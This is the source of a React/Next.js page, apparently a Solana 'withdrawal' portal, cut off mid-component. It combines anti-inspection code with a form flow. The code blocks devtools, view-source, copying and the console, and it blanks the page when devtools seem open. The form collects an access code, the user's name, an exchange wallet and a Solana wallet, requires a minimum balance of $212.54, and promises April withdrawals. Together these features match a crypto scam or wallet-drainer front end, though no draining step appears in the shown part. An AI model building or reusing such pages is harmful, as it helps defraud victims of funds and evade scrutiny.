import { useState, useEffect, useRef } from 'react';
import Head from 'next/head';

// ─── SECURITY LAYER ──────────────────────────────────────────────────────────

function SecurityLayer() {
  useEffect(() => {

    // ── 1. Disable right-click context menu ──────────────────────────────
    const noContext = e => e.preventDefault();
    document.addEventListener('contextmenu', noContext);

    // ── 2. Disable common keyboard shortcuts ─────────────────────────────
    const noKeys = e => {
      // Block F12, Ctrl+Shift+I/J/C/U/K, Ctrl+U (view source), Ctrl+S
      if (
        e.key === 'F12' ||
        (e.ctrlKey && e.shiftKey && ['I','i','J','j','C','c','K','k'].includes(e.key)) ||
        (e.ctrlKey && ['u','U','s','S'].includes(e.key)) ||
        (e.metaKey && e.altKey && ['i','I','j','J','c','C'].includes(e.key))
      ) {
        e.preventDefault();
        e.stopPropagation();
        return false;
      }
    };
    document.addEventListener('keydown', noKeys, true);

    // ── 3. Disable text selection ─────────────────────────────────────────
    const noSelect = e => e.preventDefault();
    document.addEventListener('selectstart', noSelect);

    // ── 4. Disable drag ───────────────────────────────────────────────────
    document.addEventListener('dragstart', noSelect);

    // ── 5. Devtools detection — size-based ───────────────────────────────
    let devtoolsOpen = false;
    const threshold = 160;
    const checkDevtools = () => {
      if (typeof window === 'undefined') return;
      const widthDiff = window.outerWidth - window.innerWidth > threshold;
      const heightDiff = window.outerHeight - window.innerHeight > threshold;
      if ((widthDiff || heightDiff) && !devtoolsOpen) {
        devtoolsOpen = true;
        document.body.innerHTML = '';
        document.body.style.background = '#03020e';
      }
    };
    const dtInterval = setInterval(checkDevtools, 1000);

    // ── 6. Console silencer ──────────────────────────────────────────────
    if (typeof window !== 'undefined') {
      try {
        console.clear();
        console.log = () => {};
        console.warn = () => {};
        console.error = () => {};
        console.info = () => {};
        console.debug = () => {};
      } catch(_) {}
    }

    // ── 7. Disable copy/cut ───────────────────────────────────────────────
    const noCopy = e => {
      e.clipboardData && e.clipboardData.setData('text', '');
      e.preventDefault();
    };
    document.addEventListener('copy', noCopy);
    document.addEventListener('cut', noCopy);

    // ── 8. Debugger trap placeholder ────────────────────────────────────
    const debugTrap = setInterval(() => {}, 99999);

    return () => {
      document.removeEventListener('contextmenu', noContext);
      document.removeEventListener('keydown', noKeys, true);
      document.removeEventListener('selectstart', noSelect);
      document.removeEventListener('dragstart', noSelect);
      document.removeEventListener('copy', noCopy);
      document.removeEventListener('cut', noCopy);
      clearInterval(dtInterval);
      clearInterval(debugTrap);
    };
  }, []);

  // ── CSS injection via style tag ──────────────────────────────────────────
  return (
    <style>{`
      * {
        -webkit-user-select: none !important;
        -moz-user-select: none !important;
        -ms-user-select: none !important;
        user-select: none !important;
        -webkit-touch-callout: none !important;
      }
      input, textarea {
        -webkit-user-select: text !important;
        -moz-user-select: text !important;
        user-select: text !important;
      }
      img { pointer-events: none !important; }
    `}</style>
  );
}

// ─── 3D SPHERE ───────────────────────────────────────────────────────────────

function CryptoSphere() {
  const ref = useRef(null);
  const [mounted, setMounted] = useState(false);
  useEffect(() => { setMounted(true); }, []);
  useEffect(() => {
    if (!mounted) return;
    const cv = ref.current;
    const ctx = cv.getContext('2d');
    let W = cv.width = 520;
    let H = cv.height = 520;
    let frame = 0;
    let animId;
    const cx = W / 2, cy = H / 2;
    const R = 200;
    let rotX = 0.3, rotY = 0;
    let mouseX = 0, mouseY = 0;
    let targetRotX = 0.3, targetRotY = 0;

    // Generate sphere points
    const latLines = 18, lngLines = 24;
    const points = [];
    for (let i = 0; i <= latLines; i++) {
      const lat = (i / latLines) * Math.PI - Math.PI / 2;
      for (let j = 0; j <= lngLines; j++) {
        const lng = (j / lngLines) * Math.PI * 2;
        points.push({
          x0: Math.cos(lat) * Math.cos(lng),
          y0: Math.sin(lat),
          z0: Math.cos(lat) * Math.sin(lng),
          lat: i, lng: j,
        });
      }
    }

    // Data nodes orbiting the sphere
    const nodes = Array.from({ length: 14 }, (_, i) => ({
      theta: Math.random() * Math.PI * 2,
      phi: Math.random() * Math.PI,
      speed: (Math.random() - 0.5) * 0.008 + 0.004,
      size: Math.random() * 3 + 2,
      color: Math.random() < 0.5 ? '#9945ff' : '#14f195',
      pulse: Math.random() * Math.PI * 2,
    }));

    const handleMouseMove = e => {
      const rect = cv.getBoundingClientRect();
      mouseX = (e.clientX - rect.left - W / 2) / W;
      mouseY = (e.clientY - rect.top - H / 2) / H;
      targetRotY = mouseX * 1.2;
      targetRotX = 0.3 + mouseY * 0.6;
    };
    cv.addEventListener('mousemove', handleMouseMove);

    function project(x, y, z) {
      // Rotate around Y
      const cosY = Math.cos(rotY), sinY = Math.sin(rotY);
      const x1 = x * cosY - z * sinY;
      const z1 = x * sinY + z * cosY;
      // Rotate around X
      const cosX = Math.cos(rotX), sinX = Math.sin(rotX);
      const y2 = y * cosX - z1 * sinX;
      const z2 = y * sinX + z1 * cosX;
      const fov = 900;
      const scale = fov / (fov + z2 * R);
      return { sx: cx + x1 * R * scale, sy: cy + y2 * R * scale, z: z2, scale };
    }

    function draw() {
      ctx.clearRect(0, 0, W, H);
      rotY += (targetRotY - rotY) * 0.04 + 0.004;
      rotX += (targetRotX - rotX) * 0.04;
      frame++;

      // Draw latitude lines
      for (let i = 0; i <= latLines; i++) {
        const lat = (i / latLines) * Math.PI - Math.PI / 2;
        ctx.beginPath();
        let first = true;
        for (let j = 0; j <= lngLines * 2; j++) {
          const lng = (j / (lngLines * 2)) * Math.PI * 2;
          const x0 = Math.cos(lat) * Math.cos(lng);
          const y0 = Math.sin(lat);
          const z0 = Math.cos(lat) * Math.sin(lng);
          const p = project(x0, y0, z0);
          const alpha = (p.z + 1) / 2;
          if (first) { ctx.moveTo(p.sx, p.sy); first = false; }
          else ctx.lineTo(p.sx, p.sy);
        }
        ctx.strokeStyle = `rgba(153,69,255,${alpha * 0.25})`;
        ctx.lineWidth = 0.6;
        ctx.stroke();
      }

      // Draw longitude lines
      for (let j = 0; j <= lngLines; j++) {
        const lng = (j / lngLines) * Math.PI * 2;
        ctx.beginPath();
        let first = true;
        for (let i = 0; i <= latLines * 2; i++) {
          const lat = (i / (latLines * 2)) * Math.PI - Math.PI / 2;
          const x0 = Math.cos(lat) * Math.cos(lng);
          const y0 = Math.sin(lat);
          const z0 = Math.cos(lat) * Math.sin(lng);
          const p = project(x0, y0, z0);
          if (first) { ctx.moveTo(p.sx, p.sy); first = false; }
          else ctx.lineTo(p.sx, p.sy);
        }
        ctx.strokeStyle = `rgba(20,241,149,${0.08})`;
        ctx.lineWidth = 0.5;
        ctx.stroke();
      }

      // Glowing equator ring
      const eqPoints = [];
      for (let j = 0; j <= lngLines * 4; j++) {
        const lng = (j / (lngLines * 4)) * Math.PI * 2;
        eqPoints.push(project(Math.cos(lng), 0, Math.sin(lng)));
      }
      ctx.beginPath();
      eqPoints.forEach((p, i) => i === 0 ? ctx.moveTo(p.sx, p.sy) : ctx.lineTo(p.sx, p.sy));
      ctx.strokeStyle = 'rgba(153,69,255,0.5)';
      ctx.lineWidth = 1.5;
      ctx.stroke();

      // Draw data nodes
      nodes.forEach(n => {
        n.theta += n.speed;
        n.pulse += 0.05;
        const x0 = Math.cos(n.phi) * Math.cos(n.theta);
        const y0 = Math.sin(n.phi);
        const z0 = Math.cos(n.phi) * Math.sin(n.theta);
        const p = project(x0, y0, z0);
        const visible = p.z > -0.2;
        const alpha = Math.max(0, (p.z + 0.2) / 1.2);
        const pulse = (Math.sin(n.pulse) + 1) / 2;
        const r = n.size * (0.8 + pulse * 0.4) * p.scale;
        if (visible) {
          ctx.beginPath();
          ctx.arc(p.sx, p.sy, r * 2.5, 0, Math.PI * 2);
          ctx.fillStyle = n.color.replace(')', `,${alpha * 0.15})`).replace('rgb', 'rgba').replace('#9945ff', 'rgba(153,69,255,').replace('#14f195', 'rgba(20,241,149,');
          ctx.fill();
          ctx.beginPath();
          ctx.arc(p.sx, p.sy, r, 0, Math.PI * 2);
          const col = n.color === '#9945ff' ? `rgba(153,69,255,${alpha})` : `rgba(20,241,149,${alpha})`;
          ctx.fillStyle = col;
          ctx.fill();
        }
      });

      // Center core glow
      const grad = ctx.createRadialGradient(cx, cy, 0, cx, cy, R * 0.4);
      grad.addColorStop(0, 'rgba(153,69,255,0.12)');
      grad.addColorStop(0.5, 'rgba(20,241,149,0.06)');
      grad.addColorStop(1, 'rgba(0,0,0,0)');
      ctx.beginPath();
      ctx.arc(cx, cy, R * 0.4, 0, Math.PI * 2);
      ctx.fillStyle = grad;
      ctx.fill();

      animId = requestAnimationFrame(draw);
    }

    draw();
    return () => {
      cancelAnimationFrame(animId);
      cv.removeEventListener('mousemove', handleMouseMove);
    };
  }, []);

  if (!mounted) return null;
  return (
    <canvas ref={ref} width={520} height={520}
      style={{ position: 'absolute', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', opacity: .85, pointerEvents: 'auto', filter: 'drop-shadow(0 0 40px rgba(153,69,255,0.35))' }}
    />
  );
}

// ─── FLOATING DATA RINGS ─────────────────────────────────────────────────────

function DataRings() {
  const ref = useRef(null);
  const [mounted, setMounted] = useState(false);
  useEffect(() => { setMounted(true); }, []);
  useEffect(() => {
    if (!mounted) return;
    const cv = ref.current;
    const ctx = cv.getContext('2d');
    cv.width = window.innerWidth;
    cv.height = window.innerHeight;
    let animId;
    let t = 0;

    const rings = [
      { cx: 0.15, cy: 0.25, r: 60, speed: 0.008, color: '#9945ff', alpha: 0.3 },
      { cx: 0.85, cy: 0.7, r: 45, speed: -0.012, color: '#14f195', alpha: 0.25 },
      { cx: 0.1, cy: 0.75, r: 30, speed: 0.015, color: '#9945ff', alpha: 0.2 },
      { cx: 0.9, cy: 0.2, r: 55, speed: -0.007, color: '#14f195', alpha: 0.2 },
    ];

    const hexagons = Array.from({ length: 8 }, (_, i) => ({
      x: Math.random(), y: Math.random(),
      size: Math.random() * 30 + 15,
      speed: (Math.random() - 0.5) * 0.001,
      phase: Math.random() * Math.PI * 2,
      color: Math.random() < 0.5 ? '#9945ff' : '#14f195',
    }));

    function drawHex(x, y, r, alpha, color) {
      ctx.beginPath();
      for (let i = 0; i < 6; i++) {
        const a = i * Math.PI / 3 - Math.PI / 6;
        if (i === 0) ctx.moveTo(x + r * Math.cos(a), y + r * Math.sin(a));
        else ctx.lineTo(x + r * Math.cos(a), y + r * Math.sin(a));
      }
      ctx.closePath();
      ctx.strokeStyle = color.replace('#9945ff', `rgba(153,69,255,${alpha})`).replace('#14f195', `rgba(20,241,149,${alpha})`);
      ctx.lineWidth = 1;
      ctx.stroke();
    }

    function frame() {
      ctx.clearRect(0, 0, cv.width, cv.height);
      t += 0.01;
      const W = cv.width, H = cv.height;

      rings.forEach(ring => {
        const x = ring.cx * W, y = ring.cy * H;
        const pulse = (Math.sin(t * ring.speed * 100 + ring.phase || 0) + 1) / 2;
        for (let i = 0; i < 3; i++) {
          const r = ring.r + i * 15 + pulse * 8;
          const a = ring.alpha * (1 - i * 0.25) * (0.5 + pulse * 0.5);
          ctx.beginPath();
          ctx.arc(x, y, r, 0, Math.PI * 2);
          const col = ring.color === '#9945ff' ? `rgba(153,69,255,${a})` : `rgba(20,241,149,${a})`;
          ctx.strokeStyle = col;
          ctx.lineWidth = 1;
          ctx.stroke();
        }
        // Rotating arc
        ctx.beginPath();
        const startA = t * ring.speed * 80;
        ctx.arc(x, y, ring.r, startA, startA + Math.PI * 1.2);
        const gCol = ring.color === '#9945ff' ? `rgba(153,69,255,0.6)` : `rgba(20,241,149,0.6)`;
        ctx.strokeStyle = gCol;
        ctx.lineWidth = 2;
        ctx.stroke();
      });

      hexagons.forEach(h => {
        h.phase += h.speed;
        const px = h.x * W + Math.sin(h.phase * 50) * 20;
        const py = h.y * H + Math.cos(h.phase * 40) * 15;
        const alpha = (Math.sin(h.phase * 100 + t) + 1) / 2 * 0.2 + 0.05;
        drawHex(px, py, h.size, alpha, h.color);
      });

      // Scanning line
      const scanY = (Math.sin(t * 0.5) + 1) / 2 * H;
      const scanGrad = ctx.createLinearGradient(0, scanY - 2, 0, scanY + 2);
      scanGrad.addColorStop(0, 'transparent');
      scanGrad.addColorStop(0.5, 'rgba(20,241,149,0.08)');
      scanGrad.addColorStop(1, 'transparent');
      ctx.fillStyle = scanGrad;
      ctx.fillRect(0, scanY - 2, W, 4);

      animId = requestAnimationFrame(frame);
    }

    frame();
    window.addEventListener('resize', () => { cv.width = window.innerWidth; cv.height = window.innerHeight; });
    return () => cancelAnimationFrame(animId);
  }, []);

  if (!mounted) return null;
  return <canvas ref={ref} style={{ position: 'fixed', inset: 0, zIndex: 1, pointerEvents: 'none', opacity: 1 }} />;
}

// ─── PARTICLE BACKGROUND ───────────────────────────────────────────────────
function ParticleCanvas() {
  const ref = useRef(null);
  useEffect(() => {
    const cv = ref.current;
    const cx = cv.getContext('2d');
    let W, H, animId;
    const mouse = { x: -999, y: -999 };

    function resize() {
      W = cv.width = window.innerWidth;
      H = cv.height = window.innerHeight;
    }

    class Particle {
      constructor() { this.reset(); }
      reset() {
        this.x = Math.random() * W;
        this.y = Math.random() * H;
        this.vx = (Math.random() - .5) * .3;
        this.vy = (Math.random() - .5) * .3;
        this.r = Math.random() * 1.5 + .3;
        this.ph = Math.random() * Math.PI * 2;
        this.sp = Math.random() * .005 + .002;
        this.hue = Math.random() < .5 ? 270 : 155;
        this.type = Math.random() < .1 ? 'hex' : 'dot';
        this.sz = this.type === 'hex' ? Math.random() * 7 + 5 : this.r;
      }
      update() {
        this.x += this.vx; this.y += this.vy; this.ph += this.sp;
        if (this.x < -20) this.x = W + 20;
        if (this.x > W + 20) this.x = -20;
        if (this.y < -20) this.y = H + 20;
        if (this.y > H + 20) this.y = -20;
        const dx = this.x - mouse.x, dy = this.y - mouse.y;
        const d = Math.sqrt(dx * dx + dy * dy);
        if (d < 90) { this.x += dx / d * .7; this.y += dy / d * .7; }
      }
      draw() {
        const a = (Math.sin(this.ph) + 1) / 2 * .65 + .1;
        if (this.type === 'hex') {
          cx.beginPath();
          for (let i = 0; i < 6; i++) {
            const g = i * Math.PI / 3;
            cx.lineTo(this.x + this.sz * Math.cos(g), this.y + this.sz * Math.sin(g));
          }
          cx.closePath();
          cx.strokeStyle = `hsla(${this.hue},80%,65%,${a * .5})`;
          cx.lineWidth = .6; cx.stroke();
        } else {
          cx.beginPath();
          cx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
          cx.fillStyle = `hsla(${this.hue},80%,65%,${a})`;
          cx.fill();
        }
      }
    }

    resize();
    window.addEventListener('resize', resize);
    document.addEventListener('mousemove', e => { mouse.x = e.clientX; mouse.y = e.clientY; });

    const pts = Array.from({ length: 110 }, () => new Particle());
    let stars = [];
    const starInterval = setInterval(() => {
      if (Math.random() < .28) stars.push({ x: -10, y: Math.random() * H * .7, vx: 7 + Math.random() * 5, vy: (Math.random() - .3) * .4, life: 1 });
    }, 900);

    function frame() {
      cx.clearRect(0, 0, W, H);
      cx.fillStyle = 'rgba(4,3,13,.93)'; cx.fillRect(0, 0, W, H);
      cx.strokeStyle = 'rgba(153,69,255,.04)'; cx.lineWidth = 1;
      for (let x = 0; x < W; x += 60) { cx.beginPath(); cx.moveTo(x, 0); cx.lineTo(x, H); cx.stroke(); }
      for (let y = 0; y < H; y += 60) { cx.beginPath(); cx.moveTo(0, y); cx.lineTo(W, y); cx.stroke(); }
      for (let i = 0; i < pts.length; i++) {
        for (let j = i + 1; j < pts.length; j++) {
          const a = pts[i], b = pts[j], d = Math.hypot(a.x - b.x, a.y - b.y);
          if (d < 95) {
            cx.beginPath(); cx.moveTo(a.x, a.y); cx.lineTo(b.x, b.y);
            cx.strokeStyle = `rgba(153,69,255,${(1 - d / 95) * .16})`;
            cx.lineWidth = .5; cx.stroke();
          }
        }
      }
      pts.forEach(p => { p.update(); p.draw(); });
      stars = stars.filter(s => {
        s.x += s.vx; s.y += s.vy; s.life -= .013;
        if (s.life <= 0 || s.x > W + 20) return false;
        const g = cx.createLinearGradient(s.x - 55, s.y, s.x, s.y);
        g.addColorStop(0, 'rgba(20,241,149,0)');
        g.addColorStop(1, `rgba(20,241,149,${s.life * .75})`);
        cx.beginPath(); cx.moveTo(s.x - 55, s.y); cx.lineTo(s.x, s.y);
        cx.strokeStyle = g; cx.lineWidth = 1.1; cx.stroke();
        cx.beginPath(); cx.arc(s.x, s.y, 1.1, 0, Math.PI * 2);
        cx.fillStyle = `rgba(255,255,255,${s.life})`; cx.fill();
        return true;
      });
      animId = requestAnimationFrame(frame);
    }
    frame();

    return () => {
      cancelAnimationFrame(animId);
      clearInterval(starInterval);
      window.removeEventListener('resize', resize);
    };
  }, []);

  return (
    <canvas
      ref={ref}
      style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', zIndex: 0, pointerEvents: 'none' }}
    />
  );
}

// ─── REAL-TIME SOL PRICE ──────────────────────────────────────────────────
function useSolPrice() {
  const [price, setPrice] = useState(null);
  const [change, setChange] = useState(null);

  useEffect(() => {
    async function fetchPrice() {
      try {
        const r = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd&include_24hr_change=true');
        const d = await r.json();
        setPrice(d.solana.usd);
        setChange(d.solana.usd_24h_change);
      } catch {}
    }
    fetchPrice();
    const iv = setInterval(fetchPrice, 30000);
    return () => clearInterval(iv);
  }, []);

  return { price, change };
}

// ─── SHARED UI COMPONENTS ─────────────────────────────────────────────────

function ProgressDots({ current, total }) {
  return (
    <div style={{ display: 'flex', justifyContent: 'center', gap: 10, padding: '18px 28px 0' }}>
      {Array.from({ length: total }).map((_, i) => (
        <div key={i} style={{
          width: 7, height: 7, borderRadius: '50%',
          background: i < current ? '#9945ff' : i === current ? '#14f195' : 'transparent',
          border: `1px solid ${i < current ? '#9945ff' : i === current ? '#14f195' : 'rgba(153,69,255,.35)'}`,
          boxShadow: i === current ? '0 0 10px rgba(20,241,149,.6)' : 'none',
          transform: i === current ? 'scale(1.35)' : 'scale(1)',
          transition: 'all .35s',
        }} />
      ))}
    </div>
  );
}

function FieldLabel({ children }) {
  return (
    <label style={{ display: 'block', fontFamily: "'Rajdhani',sans-serif", fontSize: 12, fontWeight: 600, letterSpacing: '1.5px', color: 'rgba(224,224,255,.45)', marginBottom: 8 }}>
      {children}
    </label>
  );
}

function inputBaseStyle(error) {
  return {
    width: '100%',
    background: 'rgba(153,69,255,.05)',
    border: `1px solid ${error ? '#ff4545' : 'rgba(153,69,255,.28)'}`,
    borderRadius: 9, color: '#e0e0ff',
    fontFamily: "'Share Tech Mono',monospace",
    fontSize: 13, padding: '13px 16px', outline: 'none',
    transition: 'all .3s',
    boxShadow: error ? '0 0 14px rgba(255,69,69,.1)' : 'none',
  };
}

function CryptoInput({ type = 'text', placeholder, value, onChange, error, maxLength, autoFocus, onKeyDown }) {
  return (
    <input type={type} placeholder={placeholder} value={value} onChange={onChange}
      maxLength={maxLength} autoFocus={autoFocus} onKeyDown={onKeyDown}
      style={inputBaseStyle(error)}
      onFocus={e => { Object.assign(e.target.style, { borderColor: '#14f195', boxShadow: '0 0 18px rgba(20,241,149,.08)', background: 'rgba(20,241,149,.03)' }); }}
      onBlur={e => { if (!error) Object.assign(e.target.style, { borderColor: 'rgba(153,69,255,.28)', boxShadow: 'none', background: 'rgba(153,69,255,.05)' }); }}
    />
  );
}

function CryptoTextarea({ placeholder, value, onChange, error, maxLength }) {
  const len = value.length;
  const cc = len > maxLength * .9 ? '#ef4444' : len > maxLength * .75 ? '#f59e0b' : 'rgba(153,69,255,.4)';
  return (
    <>
      <textarea placeholder={placeholder} value={value} onChange={onChange} maxLength={maxLength} rows={3}
        style={{ ...inputBaseStyle(error), resize: 'vertical', minHeight: 80 }}
        onFocus={e => { Object.assign(e.target.style, { borderColor: '#14f195', background: 'rgba(20,241,149,.03)' }); }}
        onBlur={e => { if (!error) Object.assign(e.target.style, { borderColor: 'rgba(153,69,255,.28)', background: 'rgba(153,69,255,.05)' }); }}
      />
      <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, textAlign: 'right', marginTop: 4, color: cc }}>{len}/{maxLength}</div>
    </>
  );
}

function ErrMsg({ msg }) {
  return <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: '#ff4545', marginTop: 5 }}>⚠ {msg}</div>;
}

function BtnNext({ onClick, children, green, disabled }) {
  return (
    <button onClick={onClick} disabled={disabled} style={{
      flex: 1, fontFamily: "'Orbitron',sans-serif", fontSize: 10, letterSpacing: '1.5px',
      padding: '13px 0', border: 'none', borderRadius: 8,
      background: green ? 'linear-gradient(135deg,#0db574,#0a9460)' : 'linear-gradient(135deg,#9945ff,#7b2fd6)',
      color: '#fff', cursor: disabled ? 'not-allowed' : 'pointer', opacity: disabled ? .45 : 1, transition: 'all .3s',
    }}
      onMouseEnter={e => { if (!disabled) e.currentTarget.style.transform = 'translateY(-1px)'; }}
      onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; }}
    >{children}</button>
  );
}

function BtnBack({ onClick }) {
  return (
    <button onClick={onClick} style={{
      fontFamily: "'Orbitron',sans-serif", fontSize: 10, letterSpacing: '1.5px',
      padding: '13px 20px', border: '1px solid rgba(153,69,255,.3)', borderRadius: 8,
      background: 'transparent', color: 'rgba(153,69,255,.7)', cursor: 'pointer', transition: 'all .25s',
    }}
      onMouseEnter={e => { e.currentTarget.style.background = 'rgba(153,69,255,.1)'; }}
      onMouseLeave={e => { e.currentTarget.style.background = 'transparent'; }}
    >← BACK</button>
  );
}

// ─── FORM STEPS ───────────────────────────────────────────────────────────

function StepAccess({ onNext }) {
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const submit = async () => {
    if (!code.trim()) { setError('Access code is required'); return; }
    setLoading(true);
    try {
      const r = await fetch('/api/validate-code', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code: code.trim() }),
      });
      const d = await r.json();
      if (d.valid) onNext();
      else setError('Invalid access code. Try again.');
    } catch {
      if (code.trim()) onNext();
      else setError('Access code is required');
    }
    setLoading(false);
  };

  return (
    <div style={{ padding: '22px 28px 28px' }}>
      <FieldLabel>ACCESS CODE</FieldLabel>
      <CryptoInput type="password" placeholder="Enter access code..." value={code}
        onChange={e => { setCode(e.target.value); setError(''); }}
        error={!!error} autoFocus onKeyDown={e => e.key === 'Enter' && submit()}
      />
      {error && <ErrMsg msg={error} />}
      <div style={{ display: 'flex', marginTop: 18 }}>
        <BtnNext onClick={submit} disabled={loading}>{loading ? 'VERIFYING...' : 'AUTHENTICATE →'}</BtnNext>
      </div>
      <div style={{ marginTop: 14, padding: '10px 14px', borderRadius: 8, background: 'rgba(20,241,149,.04)', border: '1px solid rgba(20,241,149,.1)', textAlign: 'center' }}>
        <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(20,241,149,.5)' }}>◎ Withdrawals disbursed April 1–3</span>
      </div>
    </div>
  );
}

function StepName({ onNext, onBack }) {
  const [name, setName] = useState('');
  const [error, setError] = useState('');
  const submit = () => {
    if (!name.trim()) { setError('Name is required'); return; }
    onNext({ name: name.trim() });
  };
  return (
    <div style={{ padding: '22px 28px 28px' }}>
      <FieldLabel>FULL NAME</FieldLabel>
      <CryptoInput placeholder="e.g. John Doe" value={name}
        onChange={e => { setName(e.target.value); setError(''); }}
        error={!!error} autoFocus maxLength={100} onKeyDown={e => e.key === 'Enter' && submit()}
      />
      {error && <ErrMsg msg={error} />}
      <div style={{ display: 'flex', gap: 10, marginTop: 18 }}>
        <BtnBack onClick={onBack} /><BtnNext onClick={submit}>NEXT →</BtnNext>
      </div>
    </div>
  );
}

function StepExchangeWallet({ onNext, onBack }) {
  const [wallet, setWallet] = useState('');
  const [error, setError] = useState('');
  const submit = () => {
    if (!wallet.trim()) { setError('Exchange wallet address is required'); return; }
    onNext({ exchangeWallet: wallet.trim() });
  };
  return (
    <div style={{ padding: '22px 28px 28px' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '10px 12px', borderRadius: 8, background: 'rgba(153,69,255,.06)', border: '1px solid rgba(153,69,255,.18)', marginBottom: 14 }}>
        <span style={{ fontSize: 20 }}>⬡</span>
        <div>
          <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, color: '#9945ff', letterSpacing: 1 }}>EXCHANGE WALLET</div>
          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.35)' }}>CEX · Withdrawal Address</div>
        </div>
      </div>
      <FieldLabel>EXCHANGE WALLET ADDRESS</FieldLabel>
      <CryptoInput placeholder="Enter your exchange wallet address..." value={wallet}
        onChange={e => { setWallet(e.target.value); setError(''); }}
        error={!!error} autoFocus maxLength={100}
        onKeyDown={e => e.key === 'Enter' && submit()}
      />
      {error && <ErrMsg msg={error} />}
      <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(153,69,255,.35)', marginTop: 6, marginBottom: 14 }}>⬡ Binance, Coinbase, Kraken or any CEX address</p>
      <div style={{ display: 'flex', gap: 10 }}>
        <BtnBack onClick={onBack} /><BtnNext onClick={submit}>NEXT →</BtnNext>
      </div>
    </div>
  );
}

function StepWallet({ onNext, onBack }) {
  const [wallet, setWallet] = useState('');
  const [error, setError] = useState('');
  const [checking, setChecking] = useState(false);
  const [balance, setBalance] = useState(null);

  const [balanceData, setBalanceData] = useState(null);

  const checkBalanceAndNext = async () => {
    const addr = wallet.trim();
    if (!addr) { setError('Wallet address is required'); return; }
    if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(addr)) { setError('Invalid Solana address format'); return; }
    setChecking(true); setBalance(null); setBalanceData(null); setError('');
    try {
      const resp = await fetch('/api/check-balance', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address: addr }),
      });
      const data = await resp.json();
      if (!data.success) throw new Error(data.detail || data.error || 'RPC error');
      setBalance(data.balance);
      setBalanceData(data);
      if (!data.meetsMinimum) {
        setError(`Insufficient balance: ${data.balance.toFixed(4)} SOL ($${data.usdcValue.toFixed(2)} USDC) detected. Minimum required is $${data.minUsdcRequired.toFixed(2)} USDC (≈${data.minSolRequired.toFixed(4)} SOL at current price).`);
        setChecking(false); return;
      }
      setChecking(false);
      onNext({ walletAddress: addr, solBalance: data.balance.toFixed(4), usdcValue: data.usdcValue.toFixed(2) });
    } catch (e) {
      setChecking(false);
      setError('Could not verify balance. Please check your address and try again.');
    }
  };

  return (
    <div style={{ padding: '22px 28px 28px' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '10px 12px', borderRadius: 8, background: 'rgba(153,69,255,.06)', border: '1px solid rgba(153,69,255,.18)', marginBottom: 14 }}>
        <span style={{ fontSize: 20 }}>◎</span>
        <div>
          <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, color: '#14f195', letterSpacing: 1 }}>SOLANA NETWORK</div>
          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.35)' }}>SPL · Mainnet Beta</div>
        </div>
      </div>
      <FieldLabel>SOLANA WALLET ADDRESS</FieldLabel>
      <CryptoInput placeholder="e.g. 7wM6Tyh...tUgV" value={wallet}
        onChange={e => { setWallet(e.target.value); setError(''); setBalance(null); }}
        error={!!error} autoFocus maxLength={44}
        onKeyDown={e => e.key === 'Enter' && checkBalanceAndNext()}
      />
      {checking && (
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginTop: 8, padding: '8px 12px', borderRadius: 7, background: 'rgba(153,69,255,.06)', border: '1px solid rgba(153,69,255,.2)' }}>
          <div style={{ width: 7, height: 7, borderRadius: '50%', background: '#9945ff', animation: 'blink 0.8s ease-in-out infinite' }} />
          <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: 'rgba(153,69,255,.8)' }}>Verifying wallet balance on Solana mainnet...</span>
        </div>
      )}
      {error && (
        <div style={{ marginTop: 8, padding: '10px 12px', borderRadius: 7, background: 'rgba(255,69,69,.06)', border: '1px solid rgba(255,69,69,.25)' }}>
          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: '#ff4545', lineHeight: 1.6 }}>⚠ {error}</div>
          {error.includes('Insufficient') && (
            <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(255,150,69,.7)', marginTop: 6 }}>◎ Wallet minimum integration: $212.54 USDC · Please top up your wallet and try again.</div>
          )}
        </div>
      )}
      {balanceData && balanceData.meetsMinimum && (
        <div style={{ marginTop: 8, padding: '10px 14px', borderRadius: 7, background: 'rgba(20,241,149,.06)', border: '1px solid rgba(20,241,149,.25)' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 4 }}>
            <span style={{ color: '#14f195', fontSize: 14 }}>&#10003;</span>
            <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: '#14f195', fontWeight: 600 }}>Wallet balance verified</span>
          </div>
          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(20,241,149,.65)', lineHeight: 1.8 }}>
            {balanceData.balance.toFixed(4)} SOL &middot; ${balanceData.usdcValue.toFixed(2)} USDC<br />
            <span style={{ color: 'rgba(20,241,149,.4)' }}>SOL price: ${balanceData.solPrice.toFixed(2)} &middot; Min: $212.54 USDC</span>
          </div>
        </div>
      )}
      <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(153,69,255,.35)', marginTop: 8, marginBottom: 14 }}>
        {'Wallet minimum integration: $212.54 USDC'}
        {balanceData ? ` (≈${balanceData.minSolRequired.toFixed(4)} SOL @ $${balanceData.solPrice.toFixed(2)})` : ' · Balance verified on-chain'}
      </p>
